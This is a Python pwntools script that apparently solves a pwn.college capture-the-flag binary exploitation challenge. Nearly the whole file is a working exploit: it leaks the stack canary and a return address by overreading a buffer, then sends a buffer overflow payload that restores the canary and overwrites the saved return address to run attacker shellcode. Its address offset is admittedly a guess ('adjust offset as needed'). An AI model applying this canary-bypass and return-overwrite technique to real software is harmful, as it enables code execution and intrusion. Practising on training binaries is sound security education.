from pwn import *
import glob
import os


def hack():
    p = process("/challenge/canary-conundrum-easy")
    
    # Leak both canary and return address
    leak_canary_payload = b"REPEAT" + b"A" * 99  # overwrite the \x00 byte
    
    print(p.recvuntil("Payload size:"))
    p.sendline(b"105")
    print(p.recvuntil("Send your payload"))
    p.send(leak_canary_payload)
    
    p.recvuntil("You said: ")
    data = p.recvline()
    print(f"Received data: {data.hex()}")
    
    # Extract leaked canary (bytes 105-111)
    leaked_canary = data[105:112]
    canary = b"\x00" + leaked_canary 
    print(f"Raw leaked canary bytes: {canary.hex()}")
    
    # Extract leaked return address (bytes 112-118 + we need 2 more bytes)
    # We only get 6 bytes but we need 8 for a full address
    leaked_addr_partial = data[112:118]
    print(f"Partial leaked address: {leaked_addr_partial.hex()}")
    
    # The leaked address is likely from the stack, we need to calculate the base
    # Let's assume it's a return address from main or similar function
    # We need to find the right offset to the win function
    
    # Convert the partial leaked address to a full address
    # We'll pad with zeros to make it 8 bytes, but this might need adjustment
    leaked_addr_bytes = leaked_addr_partial + b"\x00\x00"
    leaked_addr = u64(leaked_addr_bytes)
    print(f"Leaked address (as number): {hex(leaked_addr)}")
    
    # Calculate the return address for the win function
    # You'll need to adjust this offset based on your binary
    # Common approach: find the base address and add the win function offset
    # OR calculate relative offset from the leaked return address
    
    return_addr = p64(leaked_addr - 0x1170)  # adjust offset as needed
    
    print(f"[+] Leaked Canary: {canary.hex()}")
    print(f"[+] Calculated return address: {return_addr}")
    
    # Build the payload
    with open("shellcode", "rb") as f:
        shellcode = f.read()
    
    padding_len = 104 - len(shellcode)
    
    payload = shellcode
    payload += b"A" * padding_len
    payload += canary
    payload += b"B" * 8  # RBP overwrite
    payload += return_addr
    
    print(p.recvuntil("Payload size:"))
    p.sendline(str(len(payload)).encode())
    print(p.recvuntil("Send your payload"))
    p.send(payload)
    
    res = p.recvall(timeout=2)
    
    if b"pwn.college" in res:
        global IS_FLAG
        IS_FLAG = True
        print("[+] FLAG FOUND!")
    else:
        print("[~] Attempt failed, retrying...")
    
    print(res)
    p.close()

# Main execution
if __name__ == "__main__":

    hack()
